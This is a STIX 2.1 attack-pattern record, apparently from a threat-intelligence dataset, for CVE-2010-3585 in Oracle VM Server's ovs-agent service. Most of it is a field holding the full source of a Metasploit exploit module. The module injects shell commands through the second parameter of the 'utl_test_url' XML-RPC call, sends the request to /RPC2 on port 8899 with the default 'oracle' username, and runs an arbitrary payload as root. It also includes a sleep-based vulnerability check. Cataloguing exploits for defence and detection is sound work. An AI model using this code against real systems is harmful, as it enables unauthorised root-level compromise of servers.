{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8b86f235-2c71-4655-af6c-2656fa5e27b4",
    "created": "2024-08-14T17:13:40.288256Z",
    "modified": "2024-08-14T17:13:40.28826Z",
    "name": "Oracle VM Server Virtual Server Agent Command Injection",
    "description": " This module exploits a command injection flaw within Oracle\\'s VM Server Virtual Server Agent (ovs-agent) service.  By including shell meta characters within the second parameter to the 'utl_test_url' XML-RPC methodCall, an attacker can execute arbitrary commands. The service typically runs with root privileges.  NOTE: Valid credentials are required to trigger this vulnerable. The username appears to be hardcoded as 'oracle', but the password is set by the administrator at installation time. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/oracle_vm_agent_utl.rb",
            "external_id": "oracle_vm_agent_utl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3585"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle VM Server Virtual Server Agent Command Injection',\n      'Description'    => %q{\n          This module exploits a command injection flaw within Oracle\\'s VM Server\n        Virtual Server Agent (ovs-agent) service.\n\n        By including shell meta characters within the second parameter to the 'utl_test_url'\n        XML-RPC methodCall, an attacker can execute arbitrary commands. The service\n        typically runs with root privileges.\n\n        NOTE: Valid credentials are required to trigger this vulnerable. The username\n        appears to be hardcoded as 'oracle', but the password is set by the administrator\n        at installation time.\n      },\n      'Author'         => [ 'jduck' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          # ovs-agent.spec:- Fix ovs agent command injection [orabug 10146644] {CVE-2010-3585}\n          ['CVE', '2010-3585'],\n          ['OSVDB', '68797'],\n          ['BID', '44047']\n        ],\n      'Privileged'     => true,\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space' => 512,\n          'BadChars' => '<>',\n          'DisableNops' => true,\n          'Keys'  => ['cmd', 'cmd_bash'],\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-10-12'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(8899),\n        OptBool.new('SSL', [ true, 'Use SSL', true ]),\n        OptString.new('CMD', [ false,  \"A single command to execute instead of the payload\" ]),\n        OptString.new('HttpUsername', [ true,  \"The user to authenticate as\", 'oracle']),\n        OptString.new('HttpPassword', [ true,  \"The password to authenticate with\" ])\n      ])\n\n    deregister_options(\n      'HTTP::junk_params', # not your typical POST, so don't inject params.\n      'HTTP::junk_slashes' # For some reason junk_slashes doesn't always work, so turn that off for now.\n      )\n  end\n\n  def go(command)\n    xml = <<-EOS\n<?xml version=\"1.0\"?>\n<methodCall>\n<methodName>utl_test_url</methodName>\n<params><param>\n<value><string>PARAM1</string></value>\n</param></params>\n<params><param>\n<value><string>PARAM2</string></value>\n</param></params>\n<params><param>\n<value><string>PARAM3</string></value>\n</param></params>\n<params><param>\n<value><string>PARAM4</string></value>\n</param></params>\n</methodCall>\nEOS\n\n    sploit = rand_text_alphanumeric(rand(128)+32)\n    sploit << \"';\" + command + \";'\"\n\n    xml.gsub!(/PARAM1/, 'http://' + rand_text_alphanumeric(rand(128)+32) + '/')\n    xml.gsub!(/PARAM2/, sploit)\n    xml.gsub!(/PARAM3/, rand_text_alphanumeric(rand(128)+32))\n    xml.gsub!(/PARAM4/, rand_text_alphanumeric(rand(128)+32))\n\n    res = send_request_cgi(\n      {\n        'uri'          => '/RPC2',\n        'method'       => 'POST',\n        'ctype'        => 'application/xml',\n        'data'         => xml,\n      }, 5)\n\n    if not res\n      if not session_created?\n        print_error('Unable to complete XML-RPC request')\n        return nil\n      end\n\n      # no response, but session created!!!\n      return true\n    end\n\n    case res.code\n    when 403\n      print_error('Authentication failed!')\n      return nil\n\n    when 200\n      print_good('Our request was accepted!')\n      return res\n\n    end\n\n    print_error(\"Encountered unexpected #{res.code} response:\")\n    print_error(res.to_s)\n\n    return nil\n  end\n\n  def check\n    print_status(\"Attempting to detect if the server is vulnerable...\")\n\n    # Try running/timing sleep 3\n    start = Time.now\n    go('sleep 3')\n    elapsed = Time.now - start\n    if elapsed >= 3 and elapsed <= 4\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Attempting to execute the payload...\")\n\n    cmd = datastore['CMD']\n    cmd ||= payload.encoded\n\n    if not go(cmd)\n      fail_with(Failure::Unknown, \"Unable to execute the desired command\")\n    end\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}